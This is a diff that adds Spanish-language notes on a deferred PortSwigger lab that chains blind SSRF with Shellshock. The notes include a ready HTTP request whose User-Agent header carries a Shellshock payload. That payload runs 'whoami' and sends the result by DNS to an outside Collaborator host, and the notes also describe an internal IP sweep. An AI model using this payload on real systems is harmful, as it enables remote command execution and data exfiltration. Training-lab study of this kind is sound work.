@@ -15,6 +15,32 @@ PortSwigger bloquea por firewall el tráfico saliente desde el navegador del bot
 
 ## Labs aplazados
 
+### Blind SSRF Shellshock exploitation — aplazado 2026-05-06
+
+- **Blind SSRF with Shellshock exploitation**
+  https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation
+  Razón: `infra-externa-bloqueada-por-firewall + canal de exfil exclusivamente OAST`.
+
+  Composición del lab:
+  1. Mismo vector que el blind SSRF OOB detection: la cabecera `Referer` del request a un producto se pasa server-side a un componente interno.
+  2. El componente interno corre CGI scripts vulnerables a **Shellshock** (CVE-2014-6271). Hay que descubrir vía sweep el host/IP del CGI dentro de `192.168.0.0/24:8080`.
+  3. Una vez identificado el CGI, inyectar payload Shellshock en cabeceras controladas (típicamente `User-Agent`) que dispare un comando como `nslookup $(whoami).<collab>.oastify.com`.
+  4. La métrica de éxito del lab es que Collaborator reciba un DNS lookup con el `whoami` (`peter-byOyhUQB` o similar) prependido al subdominio. Hay que enviar ese username como respuesta en la sección de "Submit solution".
+
+  No hay reflejo in-band del whoami: el server del lab no devuelve el output de Shellshock al cliente, sólo lo ejecuta. La única forma de leer el resultado es vía DNS exfil a Collaborator. webhook.site/interactsh/requestbin no sirven (firewall del lab los descarta).
+
+  Payload listo para retomar (con Burp Pro):
+  ```http
+  GET /product?productId=1 HTTP/2
+  Host: <lab>.web-security-academy.net
+  Referer: http://192.168.0.X:8080/cgi-bin/<script>
+  User-Agent: () { :;}; /usr/bin/nslookup $(whoami).<COLLAB-ID>.oastify.com
+  ```
+
+  Sweep para descubrir IP+script CGI: enviar Intruder/script con `Referer: http://192.168.0.<octet>:8080/` + payload User-Agent inocuo, identificar respuestas distintas (200 con cuerpo del CGI vs 500 connection-refused). Una vez localizado, ya con Shellshock en User-Agent.
+
+  Es el primer lab que combina SSRF + descubrimiento + ejecución de comando + exfil OOB; cuando se retome con Pro, vale como writeup de "cadena multietapa" más allá del SSRF puro.
+
 ### SSRF Blind con detección out-of-band — aplazado 2026-05-06
 
 - **Blind SSRF with out-of-band detection**
